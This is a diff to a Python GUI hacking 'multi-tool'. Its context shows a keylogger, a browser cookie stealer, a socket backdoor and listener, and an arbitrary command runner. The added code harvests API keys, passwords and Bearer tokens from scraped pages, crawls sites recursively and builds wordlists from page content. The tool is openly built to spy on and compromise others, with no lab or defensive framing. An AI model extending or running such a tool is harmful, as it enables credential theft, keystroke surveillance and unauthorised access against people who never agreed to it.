@@ -11,6 +11,7 @@ import browser_cookie3
 from pynput import keyboard
 import requests
 from bs4 import BeautifulSoup
+import re
 
 # Setup Logging with Rotation
 log_file = 'multi_tool.log'
@@ -38,7 +39,8 @@ def print_banner():
     """
     print(banner)
 
-# Utility Functions
+# ===================== Utility Functions ===================== #
+
 def show_message(title, message):
     """Show a simple message box."""
     messagebox.showinfo(title, message)
@@ -48,7 +50,8 @@ def handle_exception(exception):
     logging.error(str(exception))
     messagebox.showerror("Error", str(exception))
 
-# Scanning Functions
+# ===================== Scanning Functions ===================== #
+
 def scan_target(rhost, output_area):
     """Perform a passive scan using Nmap and output results to the GUI."""
     try:
@@ -69,7 +72,8 @@ def get_os_info(nm, rhost):
         logging.warning(f"OS information not available for: {rhost}")
         return "Unknown OS"
 
-# Listener & Backdoor
+# ===================== Listener & Backdoor ===================== #
+
 def create_backdoor(lhost, port=8080, output_area=None):
     """Create a simple backdoor using sockets."""
     try:
@@ -111,7 +115,8 @@ def create_listener(lhost, port=8081, output_area=None):
     except Exception as e:
         handle_exception(e)
 
-# Terminal & AI
+# ===================== Terminal & AI ===================== #
+
 def run_terminal_command(command, output_area):
     """Run any command from the terminal tab."""
     try:
@@ -139,7 +144,8 @@ def ai_suggestions(query, output_area):
             return
     output_area.insert(tk.END, "No AI suggestion found for the query.\n")
 
-# Keylogger & Cookie Stealer
+# ===================== Keylogger & Cookie Stealer ===================== #
+
 def start_keylogger(output_area):
     """Start a simple keylogger."""
     def on_press(key):
@@ -163,7 +169,19 @@ def steal_cookies(output_area):
     except Exception as e:
         handle_exception(e)
 
-# Web Scraping
+# ===================== Web Scraping and Cyber Intel ===================== #
+
+def find_secrets(html, output_area):
+    """Identify potential sensitive information (e.g., API keys, passwords) in the HTML."""
+    regex_patterns = [
+        r'(?i)(api_key|apikey|access_token|auth_token|secret|password)\s*[:=]\s*[\'"]?([A-Za-z0-9_-]+)[\'"]?',
+        r'(?i)Bearer\s+([A-Za-z0-9_-]+)'
+    ]
+    for pattern in regex_patterns:
+        matches = re.findall(pattern, html)
+        if matches:
+            output_area.insert(tk.END, f"Found potential secrets: {matches}\n")
+
 def scrape_webpage(url, output_area):
     """Scrape data from a webpage and display in the GUI."""
     try:
@@ -171,6 +189,7 @@ def scrape_webpage(url, output_area):
         response = requests.get(url)
         if response.status_code == 200:
             soup = BeautifulSoup(response.content, 'html.parser')
+            html_content = response.text
 
             # Scrape all paragraphs
             paragraphs = soup.find_all('p')
@@ -190,12 +209,55 @@ def scrape_webpage(url, output_area):
             for header in headers:
                 output_area.insert(tk.END, header.get_text() + "\n")
 
+            # Find secrets in HTML
+            output_area.insert(tk.END, "Looking for secrets...\n")
+            find_secrets(html_content, output_area)
+
         else:
             output_area.insert(tk.END, f"Error: Unable to scrape URL (Status Code: {response.status_code})\n")
     except Exception as e:
         handle_exception(e)
 
-# GUI & Application
+# ===================== Web Crawler and Spider ===================== #
+
+def crawl_website(url, output_area, depth=2):
+    """Crawl a website for all links up to a specified depth."""
+    try:
+        output_area.insert(tk.END, f"Crawling URL: {url} (Depth: {depth})\n")
+        visited = set()
+
+        def crawl(url, depth):
+            if depth == 0 or url in visited:
+                return
+            visited.add(url)
+            response = requests.get(url)
+            soup = BeautifulSoup(response.content, 'html.parser')
+
+            links = soup.find_all('a', href=True)
+            output_area.insert(tk.END, f"Links on {url}:\n")
+            for link in links:
+                href = link['href']
+                if href.startswith("http"):
+                    output_area.insert(tk.END, f"{href}\n")
+                    crawl(href, depth - 1)
+
+        crawl(url, depth)
+    except Exception as e:
+        handle_exception(e)
+
+# ===================== AI Wordlist Generator ===================== #
+
+def generate_wordlist_from_content(content, output_area):
+    """Generate a wordlist based on the content of a webpage."""
+    words = re.findall(r'\b\w+\b', content)
+    unique_words = set(words)
+
+    output_area.insert(tk.END, "Generated Wordlist:\n")
+    for word in unique_words:
+        output_area.insert(tk.END, f"{word}\n")
+
+# ===================== GUI & Application ===================== #
+
 def create_gui():
     """Create the main GUI with tabbed interface."""
     root = tk.Tk()
@@ -279,6 +341,17 @@ def create_gui():
     scraper_button = tk.Button(scraper_tab, text="Scrape Website", 
                                command=lambda: scrape_webpage(scraper_url.get(), scraper_output))
     scraper_button.pack(pady=5)
+
+    # Web Crawler Tab
+    crawler_tab = ttk.Frame(notebook)
+    notebook.add(crawler_tab, text="Web Crawler")
+    crawler_output = scrolledtext.ScrolledText(crawler_tab, wrap=tk.WORD)
+    crawler_output.pack(expand=True, fill='both')
+    crawler_url = tk.Entry(crawler_tab)
+    crawler_url.pack(fill='x', padx=10, pady=5)
+    crawler_button = tk.Button(crawler_tab, text="Start Crawl", 
+                               command=lambda: crawl_website(crawler_url.get(), crawler_output))
+    crawler_button.pack(pady=5)
 
     root.mainloop()
 
